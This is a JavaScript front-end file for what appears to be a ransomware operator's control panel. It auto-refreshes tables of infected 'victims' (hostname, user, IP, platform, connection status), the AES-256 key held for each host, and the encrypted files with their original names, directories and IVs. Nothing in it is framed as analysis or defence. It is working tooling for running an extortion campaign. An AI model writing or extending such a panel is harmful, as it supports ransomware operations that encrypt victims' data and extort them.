// ===============================
// DATABASE PAGE LOGIC
// ===============================

let currentTab = 'victims';
let allData = {
    victims: [],
    keys: [],
    encrypted: []
};

document.addEventListener('DOMContentLoaded', () => {
    console.log('Database page loaded');

    // Tab switching
    document.querySelectorAll('.tab-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            currentTab = btn.dataset.tab;
            renderTable();
        });
    });

    // Filter input
    document.getElementById('filterInput').addEventListener('input', renderTable);

    // Initial load
    refreshData();

    // Auto-refresh every 30 seconds
    setInterval(refreshData, 30000);
});

async function refreshData() {
    try {
        // Load stats
        const statsRes = await fetch('/api/db/stats');
        const stats = await statsRes.json();
        document.getElementById('statVictims').textContent = stats.victims || 0;
        document.getElementById('statKeys').textContent = stats.keys || 0;
        document.getElementById('statEncrypted').textContent = stats.encrypted || 0;

        // Load all data
        const [victimsRes, keysRes, encryptedRes] = await Promise.all([
            fetch('/api/db/victims'),
            fetch('/api/db/keys'),
            fetch('/api/db/encrypted')
        ]);

        const victimsData = await victimsRes.json();
        const keysData = await keysRes.json();
        const encryptedData = await encryptedRes.json();

        allData.victims = victimsData.data || [];
        allData.keys = keysData.data || [];
        allData.encrypted = encryptedData.data || [];

        renderTable();
    } catch (e) {
        console.error('Error loading data:', e);
    }
}

function renderTable() {
    const container = document.getElementById('tableContainer');
    const filter = document.getElementById('filterInput').value.toLowerCase();

    let data = allData[currentTab] || [];

    // Apply filter
    if (filter) {
        data = data.filter(row => {
            return Object.values(row).some(val =>
                String(val).toLowerCase().includes(filter)
            );
        });
    }

    if (data.length === 0) {
        container.innerHTML = '<div class="no-data"><i class="ph ph-database" style="font-size:48px;"></i><p>No hay datos disponibles</p></div>';
        return;
    }

    let html = '';

    if (currentTab === 'victims') {
        html = renderVictimsTable(data);
    } else if (currentTab === 'keys') {
        html = renderKeysTable(data);
    } else if (currentTab === 'encrypted') {
        html = renderEncryptedTable(data);
    }

    container.innerHTML = html;
}

function renderVictimsTable(data) {
    return `
    <table class="data-table">
      <thead>
        <tr>
          <th>UUID</th>
          <th>Hostname</th>
          <th>Usuario</th>
          <th>IP</th>
          <th>Plataforma</th>
          <th>Arch</th>
          <th>Estado</th>
          <th>Fecha</th>
        </tr>
      </thead>
      <tbody>
        ${data.map(row => `
          <tr>
            <td class="mono">${row.uuid || '-'}</td>
            <td><strong>${row.hostname || '-'}</strong></td>
            <td>${row.username || '-'}</td>
            <td>${row.ip || '-'}</td>
            <td>${row.platform || '-'}</td>
            <td>${row.arch || '-'}</td>
            <td class="${row.status === 'connected' ? 'status-connected' : 'status-disconnected'}">${row.status || '-'}</td>
            <td>${formatDate(row.created_at)}</td>
          </tr>
        `).join('')}
      </tbody>
    </table>
  `;
}

function renderKeysTable(data) {
    return `
    <table class="data-table">
      <thead>
        <tr>
          <th>UUID</th>
          <th>Hostname</th>
          <th>Clave AES-256</th>
          <th>Fecha</th>
        </tr>
      </thead>
      <tbody>
        ${data.map(row => `
          <tr>
            <td class="mono">${row.uuid || '-'}</td>
            <td><strong>${row.hostname || '-'}</strong></td>
            <td class="mono" style="max-width:400px;">${row.aes_key || '-'}</td>
            <td>${formatDate(row.created_at)}</td>
          </tr>
        `).join('')}
      </tbody>
    </table>
  `;
}

function renderEncryptedTable(data) {
    return `
    <table class="data-table">
      <thead>
        <tr>
          <th>UUID</th>
          <th>Hostname</th>
          <th>Archivo Cifrado</th>
          <th>Original</th>
          <th>Directorio</th>
          <th>IV</th>
          <th>Fecha</th>
        </tr>
      </thead>
      <tbody>
        ${data.map(row => `
          <tr>
            <td class="mono">${row.uuid || '-'}</td>
            <td><strong>${row.hostname || '-'}</strong></td>
            <td>${row.file_name || '-'}</td>
            <td>${row.original_name || '-'}</td>
            <td style="max-width:200px; word-break:break-all;">${row.directory || '-'}</td>
            <td class="mono">${row.iv || '-'}</td>
            <td>${formatDate(row.created_at)}</td>
          </tr>
        `).join('')}
      </tbody>
    </table>
  `;
}

function formatDate(dateStr) {
    if (!dateStr) return '-';
    const d = new Date(dateStr);
    return d.toLocaleDateString('es-ES') + ' ' + d.toLocaleTimeString('es-ES', { hour: '2-digit', minute: '2-digit' });
}

// Global refresh function for button
window.refreshData = refreshData;
